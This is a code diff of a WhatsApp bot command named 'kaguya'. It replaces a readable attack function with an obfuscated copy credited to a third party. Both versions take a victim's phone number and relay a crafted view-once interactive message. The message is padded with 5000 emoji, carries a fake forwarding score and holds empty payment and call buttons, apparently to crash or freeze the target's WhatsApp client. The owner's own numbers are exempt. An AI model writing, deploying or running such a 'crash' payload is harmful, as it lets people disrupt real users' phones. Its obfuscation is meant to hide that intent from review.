@@ -1,68 +1,7 @@
-// commands/kaguya.js
-const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];
-
-async function kaguyaCommand(sock, chatId, message, args) {
-    if (!message.key.fromMe) {
-        await sock.sendMessage(chatId, { text: "❌ *Owner Only*" }, { quoted: message });
-        return;
-    }
-
-    const targetNumber = args[0];
-    if (!targetNumber) {
-        await sock.sendMessage(chatId, { 
-            text: "🌙 *Kaguya Ōtsutsuki*\n\nUsage: .kaguya <number>\nExample: .kaguya 628123456789\n\n*Infinite Tsukuyomi*"
-        }, { quoted: message });
-        return;
-    }
-
-    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
-    
-    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
-        await sock.sendMessage(chatId, { text: "🛡️ *Protected by Six Paths*" }, { quoted: message });
-        return;
-    }
-
-    const target = cleanNumber + '@s.whatsapp.net';
-    
-    await sock.sendMessage(chatId, { text: `🌙 *Infinite Tsukuyomi* casting on ${cleanNumber}...` }, { quoted: message });
-    await sock.sendMessage(chatId, { react: { text: "🌙", key: message.key } });
-
-    try {
-        const tsukuyomiPayload = {
-            viewOnceMessage: {
-                message: {
-                    messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
-                    interactiveMessage: {
-                        contextInfo: {
-                            mentionedJid: [target],
-                            isForwarded: true,
-                            forwardingScore: 999,
-                            businessMessageForwardInfo: { businessOwnerJid: target }
-                        },
-                        body: { title: "👑", text: "✦ Kąģüʏȧ Ōƭṡüƭṡüḳī ✦" + "🌙".repeat(5000), description: "💌", footer: "Infinite Tsukuyomi" },
-                        nativeFlowMessage: {
-                            buttons: [
-                                { name: "single_select", buttonParamsJson: "" },
-                                { name: "view_product", buttonParamsJson: "" },
-                                { name: "payment_method", buttonParamsJson: "" },
-                                { name: "call_permission_request", buttonParamsJson: "" },
-                                { name: "payment_info", buttonParamsJson: "" }
-                            ]
-                        }
-                    }
-                }
-            }
-        };
-
-        await sock.relayMessage(target, tsukuyomiPayload, { participant: { jid: target } });
-        
-        await sock.sendMessage(chatId, { text: `✅ *Infinite Tsukuyomi* activated on ${cleanNumber}` }, { quoted: message });
-        await sock.sendMessage(chatId, { react: { text: "🕳️", key: message.key } });
-
-    } catch (error) {
-        console.error('[Kaguya]', error.message);
-        await sock.sendMessage(chatId, { text: `❌ *Tsukuyomi failed:* ${error.message}` }, { quoted: message });
-    }
-}
-
-module.exports = kaguyaCommand;
+// ============================================
+//  Obfuscated by Nabees Tech
+//  Domain: git.nabees.online
+//  WhatsApp: https://whatsapp.com/channel/0029VawtjOXJpe8X3j3NCZ3j
+//  Protected - Do not redistribute
+// ============================================
+function _0x4923(_0x5407db,_0x4ed42e){_0x5407db=_0x5407db-0x14a;const _0x3d1508=_0x3d15();let _0x4923c8=_0x3d1508[_0x5407db];if(_0x4923['suCBHC']===undefined){var _0x4616a9=function(_0x2fbfea){const _0x209b65='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x2aa6d2='',_0x593c82='';for(let _0x1ec0a4=0x0,_0x57217f,_0x390dd1,_0x46035d=0x0;_0x390dd1=_0x2fbfea['charAt'](_0x46035d++);~_0x390dd1&&(_0x57217f=_0x1ec0a4%0x4?_0x57217f*0x40+_0x390dd1:_0x390dd1,_0x1ec0a4++%0x4)?_0x2aa6d2+=String['fromCharCode'](0xff&_0x57217f>>(-0x2*_0x1ec0a4&0x6)):0x0){_0x390dd1=_0x209b65['indexOf'](_0x390dd1);}for(let _0x5c7e11=0x0,_0xaf3cd5=_0x2aa6d2['length'];_0x5c7e11<_0xaf3cd5;_0x5c7e11++){_0x593c82+='%'+('00'+_0x2aa6d2['charCodeAt'](_0x5c7e11)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x593c82);};_0x4923['hejYmR']=_0x4616a9,_0x4923['DWaiar']={},_0x4923['suCBHC']=!![];}const _0x3a315a=_0x3d1508[0x0],_0x16e98d=_0x5407db+_0x3a315a,_0x21b3a5=_0x4923['DWaiar'][_0x16e98d];return!_0x21b3a5?(_0x4923c8=_0x4923['hejYmR'](_0x4923c8),_0x4923['DWaiar'][_0x16e98d]=_0x4923c8):_0x4923c8=_0x21b3a5,_0x4923c8;}const _0x335197=_0x4923;(function(_0x5c5ea7,_0x4cb192){const _0x466dfe=_0x4923,_0x2fb839=_0x5c5ea7();while(!![]){try{const _0x1dcbac=parseInt(_0x466dfe(0x190))/0x1+parseInt(_0x466dfe(0x16d))/0x2+-parseInt(_0x466dfe(0x175))/0x3*(parseInt(_0x466dfe(0x169))/0x4)+parseInt(_0x466dfe(0x161))/0x5+parseInt(_0x466dfe(0x160))/0x6+-parseInt(_0x466dfe(0x163))/0x7*(parseInt(_0x466dfe(0x194))/0x8)+parseInt(_0x466dfe(0x159))/0x9*(parseInt(_0x466dfe(0x18e))/0xa);if(_0x1dcbac===_0x4cb192)break;else _0x2fb839['push'](_0x2fb839['shift']());}catch(_0x4fba24){_0x2fb839['push'](_0x2fb839['shift']());}}}(_0x3d15,0x96929));function _0x3d15(){const _0x432837=['mJeYmJy2vLbfCxLV','odqZ','rLP6wgS','CgXLoIaUA2fNDq','Cgf5BwvUDf9Tzq','EKXTDha','BwvZC2fNzq','8j+vS++4JW','mteWodmWmLvuteXOuq','sgrpBLu','sLzzvLG','Cc5Uzxq','BwjLCJ4krxHHBq','CMvWzwf0','ugf0AhmQ','zNjVBu1L','y2fSBf9WzxjTAq','C3nPB25FCMvXDq','nty3odKkcIPjBG','AxngB3j3yxjKzq','A2v5','lI4U','EweGnJi4mtiZna','CNnPB24','sw5MAw5PDguGva','C3nHz2vgB3j3yq','tuLZqwi','DgHVza','CMvSyxLnzxnZyq','8j+BOE+4JYaQuhjVDgvJDa','BMvYsMLK','BxnkC29U','zwn0','mti0odeWBKzIyMPS','zwqGyNKGu2L4ia','mJKZndKYAxHcDfHx','q3nmwwS','y2jqwLC','mJm0nZa3mJe4mG','mJyZmJCYrLD5vMvQ','4P2micPpD25LCIbp','C3vRDxLVBwK','Dgv4Da','zgv2AwnLtgLZDa','CfzAtxO','CMvHy3q','twv0ywrHDge','u2nVCMu','zxn0','XQ3HUAhdVmAT4BMHW7ZHUlpeQYdINky','CxvVDgvK','A2fNDxLHidXUDq','zwqGB24G','BMfTzq','twv0ywrHDgfwzq','yNv0Dg9UugfYyq','cGPvC2fNztOGlG','8j+mMsaQsw5MAw5PDa','CMrjBMzV','ig9Uia','mtuZCKLcsw9W','zsbuC3vRDxLVBq','zxHWB3j0CW','4PYficPjBMzPBML0','yNvZAw5LC3nnzq','Aw5JBhvKzxm','mJm0ota0otyZnG','mJeWntC0ofHZCwLYwG','mtqZmZq1nxn1z3bUrq','zM9YD2fYzgLUzW','ntzUwgzPthe','C2vUze1LC3nHzW','A3v5B21PkG','qhmUD2HHDhnHCa','BwKGzMfPBgvKoG','yNvZAw5LC3npDW','nfHNqujmEq','BfDKwfu','Cgf5BwvUDf9PBG','otyW'];_0x3d15=function(){return _0x432837;};return _0x3d15();}const PROTECTED_NUMBERS=[_0x335197(0x193)+_0x335197(0x16c),_0x335197(0x15f)+_0x335197(0x16e)];async function kaguyaCommand(_0x19dbad,_0x444195,_0x338373,_0x2acf58){const _0x22fbf5=_0x335197,_0x3a5b91={};_0x3a5b91[_0x22fbf5(0x177)]=_0x22fbf5(0x195)+'nly*',_0x3a5b91[_0x22fbf5(0x176)]='🌙\x20*Kaguya\x20'+'Ōtsutsuki*'+_0x22fbf5(0x155)+_0x22fbf5(0x150)+_0x22fbf5(0x179)+_0x22fbf5(0x170)+_0x22fbf5(0x183)+_0x22fbf5(0x17f)+'finite\x20Tsu'+_0x22fbf5(0x165),_0x3a5b91[_0x22fbf5(0x192)]=_0x22fbf5(0x166)+_0x22fbf5(0x178),_0x3a5b91[_0x22fbf5(0x199)]=function(_0xe97eb7,_0x562c9b){return _0xe97eb7+_0x562c9b;},_0x3a5b91[_0x22fbf5(0x172)]='✦\x20Kąģüʏȧ\x20Ō'+_0x22fbf5(0x14e),_0x3a5b91['MIsAb']=_0x22fbf5(0x185)+_0x22fbf5(0x196),_0x3a5b91[_0x22fbf5(0x16f)]='single_sel'+_0x22fbf5(0x18d),_0x3a5b91[_0x22fbf5(0x191)]='view_produ'+'ct',_0x3a5b91[_0x22fbf5(0x16a)]='[Kaguya]';const _0x545fff=_0x3a5b91;if(!_0x338373[_0x22fbf5(0x181)][_0x22fbf5(0x17c)]){const _0x1be895={};_0x1be895['text']=_0x545fff[_0x22fbf5(0x177)];const _0x28ed77={};_0x28ed77[_0x22fbf5(0x14f)]=_0x338373,await _0x19dbad[_0x22fbf5(0x164)+'e'](_0x444195,_0x1be895,_0x28ed77);return;}const _0x5863a3=_0x2acf58[0x0];if(!_0x5863a3){const _0x13161f={};_0x13161f[_0x22fbf5(0x197)]=_0x545fff[_0x22fbf5(0x176)];const _0x177068={};_0x177068[_0x22fbf5(0x14f)]=_0x338373,await _0x19dbad[_0x22fbf5(0x164)+'e'](_0x444195,_0x13161f,_0x177068);return;}const _0x3d745d=_0x5863a3['replace'](/[^0-9]/g,'');if(PROTECTED_NUMBERS[_0x22fbf5(0x15e)](_0x3d745d)){const _0x49c443={};_0x49c443[_0x22fbf5(0x197)]=_0x22fbf5(0x18a)+_0x22fbf5(0x18f)+_0x22fbf5(0x17b);const _0x29488e={};_0x29488e[_0x22fbf5(0x14f)]=_0x338373,await _0x19dbad[_0x22fbf5(0x164)+'e'](_0x444195,_0x49c443,_0x29488e);return;}const _0x1995a4=_0x3d745d+_0x545fff[_0x22fbf5(0x192)],_0x1d9100={};_0x1d9100['text']=_0x22fbf5(0x156)+_0x22fbf5(0x15a)+'i*\x20casting'+_0x22fbf5(0x158)+_0x3d745d+_0x22fbf5(0x182);const _0x59ee72={};_0x59ee72[_0x22fbf5(0x14f)]=_0x338373,await _0x19dbad[_0x22fbf5(0x164)+'e'](_0x444195,_0x1d9100,_0x59ee72);const _0x50f626={};_0x50f626['text']='🌙',_0x50f626[_0x22fbf5(0x181)]=_0x338373[_0x22fbf5(0x181)];const _0x5c2a6c={};_0x5c2a6c[_0x22fbf5(0x14a)]=_0x50f626,await _0x19dbad[_0x22fbf5(0x164)+'e'](_0x444195,_0x5c2a6c);try{const _0x163c10={};_0x163c10[_0x22fbf5(0x198)+_0x22fbf5(0x14b)]={},_0x163c10[_0x22fbf5(0x198)+_0x22fbf5(0x153)+_0x22fbf5(0x184)]=0x2;const _0x58d2fd={};_0x58d2fd['mentionedJ'+'id']=[_0x1995a4],_0x58d2fd[_0x22fbf5(0x180)+'d']=!![],_0x58d2fd[_0x22fbf5(0x162)+_0x22fbf5(0x14c)]=0x3e7,_0x58d2fd[_0x22fbf5(0x15d)+_0x22fbf5(0x186)+_0x22fbf5(0x157)]={},_0x58d2fd[_0x22fbf5(0x15d)+_0x22fbf5(0x186)+_0x22fbf5(0x157)][_0x22fbf5(0x168)+_0x22fbf5(0x18b)]=_0x1995a4;const _0x530a71={};_0x530a71[_0x22fbf5(0x152)]=_0x22fbf5(0x171)+_0x22fbf5(0x188),_0x530a71[_0x22fbf5(0x154)+_0x22fbf5(0x18c)]='';const _0x28eba9={};_0x28eba9[_0x22fbf5(0x152)]=_0x22fbf5(0x17d)+_0x22fbf5(0x17e)+_0x22fbf5(0x14d),_0x28eba9[_0x22fbf5(0x154)+_0x22fbf5(0x18c)]='';const _0x1d6118={};_0x1d6118['name']=_0x22fbf5(0x16b)+'fo',_0x1d6118[_0x22fbf5(0x154)+_0x22fbf5(0x18c)]='';const _0xca0c50={'viewOnceMessage':{'message':{'messageContextInfo':_0x163c10,'interactiveMessage':{'contextInfo':_0x58d2fd,'body':{'title':'👑','text':_0x545fff[_0x22fbf5(0x199)](_0x545fff[_0x22fbf5(0x172)],'🌙'[_0x22fbf5(0x17a)](0x1388)),'description':'💌','footer':_0x545fff[_0x22fbf5(0x187)]},'nativeFlowMessage':{'buttons':[{'name':_0x545fff[_0x22fbf5(0x16f)],'buttonParamsJson':''},{'name':_0x545fff['CsLYk'],'buttonParamsJson':''},_0x530a71,_0x28eba9,_0x1d6118]}}}}};await _0x19dbad[_0x22fbf5(0x189)+'ge'](_0x1995a4,_0xca0c50,{'participant':{'jid':_0x1995a4}});const _0x4be504={};_0x4be504[_0x22fbf5(0x197)]=_0x22fbf5(0x15c)+_0x22fbf5(0x15a)+'i*\x20activat'+_0x22fbf5(0x151)+_0x3d745d;const _0x2bc9d5={};_0x2bc9d5[_0x22fbf5(0x14f)]=_0x338373,await _0x19dbad['sendMessag'+'e'](_0x444195,_0x4be504,_0x2bc9d5);const _0x56f0f9={};_0x56f0f9['text']=_0x22fbf5(0x174),_0x56f0f9[_0x22fbf5(0x181)]=_0x338373[_0x22fbf5(0x181)];const _0x2ded67={};_0x2ded67[_0x22fbf5(0x14a)]=_0x56f0f9,await _0x19dbad[_0x22fbf5(0x164)+'e'](_0x444195,_0x2ded67);}catch(_0x3e368f){console['error'](_0x545fff[_0x22fbf5(0x16a)],_0x3e368f['message']);const _0x581d9c={};_0x581d9c['text']='❌\x20*Tsukuyo'+_0x22fbf5(0x167)+'*\x20'+_0x3e368f[_0x22fbf5(0x173)];const _0x233b84={};_0x233b84[_0x22fbf5(0x14f)]=_0x338373,await _0x19dbad[_0x22fbf5(0x164)+'e'](_0x444195,_0x581d9c,_0x233b84);}}module[_0x335197(0x15b)]=kaguyaCommand;
